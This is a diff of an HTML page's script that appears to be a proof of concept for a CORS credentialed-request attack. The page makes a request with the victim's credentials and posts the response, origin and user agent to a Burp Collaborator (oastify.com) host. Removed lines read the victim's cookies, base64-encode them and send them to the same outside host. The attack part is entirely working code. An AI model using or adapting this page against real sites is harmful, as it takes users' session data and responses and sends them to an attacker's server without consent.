@@ -11,57 +11,32 @@
         credentials: 'include',
         headers: {
             'Content-Type': 'application/json',
-            'Origin': 'https://your-domain.com'
+            'Origin': 'https://zeynaal.github.io'
         },
         body: JSON.stringify([{
-            event: 'test',
+            event: 'page_view',
             properties: {
                 url: window.location.href,
                 timestamp: new Date().toISOString()
             }
         }])
     })
-    .then(response => {
-        // Get response text
-        return response.text();
-    })
+    .then(r => r.text())
     .then(data => {
-        // Get cookies (if any)
-        var cookies = document.cookie || 'No cookies (HttpOnly)';
-        
-        // Encode cookies in base64
-        var encodedCookies = btoa(unescape(encodeURIComponent(cookies)));
-        var encodedResponse = btoa(unescape(encodeURIComponent(data)));
-        
-        // Send to Collaborator
+        // Send response to Collaborator (without cookies)
         fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
             method: 'POST',
             mode: 'no-cors',
             body: JSON.stringify({
-                response: encodedResponse,
-                response_raw: data,
-                cookies: encodedCookies,
-                cookies_raw: cookies,
-                origin: window.location.origin
+                response: data,
+                origin: window.location.origin,
+                userAgent: navigator.userAgent
             })
         });
-        
-        console.log('[+] Data sent to Collaborator!');
-        console.log('[+] Cookies (base64):', encodedCookies);
-        console.log('[+] Cookies (raw):', cookies);
+        console.log('[+] Sent to Collaborator!');
+        console.log('[+] Response:', data);
     })
-    .catch(error => {
-        // Send error to Collaborator
-        fetch('https://yuwponvu168v1ltzgwpw6spct3zunkb9.oastify.com', {
-            method: 'POST',
-            mode: 'no-cors',
-            body: JSON.stringify({
-                error: error.toString(),
-                origin: window.location.origin
-            })
-        });
-        console.log('[-] Error:', error);
-    });
+    .catch(e => console.log('Error:', e));
     </script>
 </body>
 </html>
